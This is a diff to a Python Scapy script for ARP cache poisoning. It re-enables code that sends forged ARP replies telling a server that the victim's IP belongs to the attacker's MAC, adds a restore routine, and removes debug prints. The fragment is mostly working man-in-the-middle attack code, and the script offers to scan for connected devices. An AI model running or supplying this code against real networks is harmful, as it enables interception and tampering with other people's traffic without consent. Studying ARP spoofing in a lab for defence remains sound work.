@@ -24,22 +24,21 @@ def arp(VICTIM_MAC, VICTIM_IP):
 
 	sendp(arp, iface=Net_Interface)
 
-	#Poison the Linux Webserver
-	#arp= Ether() / ARP()
-	#arp[Ether].src = ATTACKER_MAC
-	#arp[ARP].hwsrc = ATTACKER_MAC
-	#arp[ARP].psrc = VICTIM_IP
-	#arp[ARP].hwdst = SERVER_MAC
-	#arp[ARP].pdst = SERVER_IP
+	#Poison the Server
+	arp= Ether() / ARP()
+	arp[Ether].src = ATTACKER_MAC
+	arp[ARP].hwsrc = ATTACKER_MAC
+	arp[ARP].psrc = VICTIM_IP
+	arp[ARP].hwdst = SERVER_MAC
+	arp[ARP].pdst = SERVER_IP
 
-	#sendp(arp, iface=Net_Interface)
+	sendp(arp, iface=Net_Interface)
 
 	print("Pisoned the ARP of the following IPs: " + VICTIM_IP +" and "+ SERVER_IP);
     	
 	return
 	
 def restore_arp(VICTIM_MAC, VICTIM_IP):
-	print("aaa:")
 	arp = Ether() / ARP()
 	arp[Ether].src = ATTACKER_MAC
 	arp[Ether].dst = SERVER_MAC
@@ -49,17 +48,15 @@ def restore_arp(VICTIM_MAC, VICTIM_IP):
 	arp[ARP].pdst = SERVER_IP
 	sendp(arp, iface=Net_Interface)
         
-	print("panana")
-        
-	#arp = Ether() / ARP()
-	#arp[Ether].src = ATTACKER_MAC
-	#arp[Ether].dst = VICTIM_MAC
-	#arp[ARP].hwsrc = SERVER_MAC
-	#arp[ARP].psrc = SERVER_IP
-	#arp[ARP].hwdst = VICTIM_MAC
-	#arp[ARP].pdst = VICTIM_IP
-	#sendp(arp, iface=Net_Interface)
-	print("asda")
+        #Restore the ARP cache of the server
+	arp = Ether() / ARP()
+	arp[Ether].src = ATTACKER_MAC
+	arp[Ether].dst = VICTIM_MAC
+	arp[ARP].hwsrc = SERVER_MAC
+	arp[ARP].psrc = SERVER_IP
+	arp[ARP].hwdst = VICTIM_MAC
+	arp[ARP].pdst = VICTIM_IP
+	sendp(arp, iface=Net_Interface)
 	return
 
 print("Want to scan for all connected devices in the network? (Y/N)")
